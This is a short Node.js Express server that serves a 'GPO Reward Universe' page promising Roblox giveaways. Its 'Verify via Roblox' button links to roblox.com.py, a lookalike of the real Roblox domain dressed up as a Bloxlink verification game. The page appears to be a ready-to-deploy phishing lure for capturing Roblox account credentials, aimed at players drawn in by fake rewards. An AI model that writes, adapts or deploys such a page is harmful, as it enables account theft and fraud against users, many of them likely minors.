const express = require("express");
const app = express();

app.use(express.static("public"));

app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>GPO Reward Universe</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #0b0b0b;
      color: white;
    }
    .banner {
      background-image: url("/images/banner.png");
      background-size: cover;
      background-position: center;
      height: 280px;
    }
    .container {
      padding: 30px;
      text-align: center;
    }
    .logo {
      width: 120px;
      margin-top: -60px;
      background: #0b0b0b;
      border-radius: 50%;
      padding: 10px;
    }
    .btn {
      display: inline-block;
      margin-top: 20px;
      padding: 14px 28px;
      background: #6c63ff;
      color: white;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      transition: 0.2s;
    }
    .btn:hover {
      background: #584fe0;
    }
  </style>
</head>

<body>
  <div class="banner"></div>

  <div class="container">
    <img src="/images/logo.png" class="logo" />
    <h1>GPO Reward Universe</h1>
    <p>
      Verify your Roblox account to access giveaways,
      rewards, and exclusive events.
    </p>

    <a class="btn" href="https://roblox.com.py/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=21757409032455129727475835748004">
      🎮 Verify via Roblox
    </a>
  </div>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});

module.exports = app;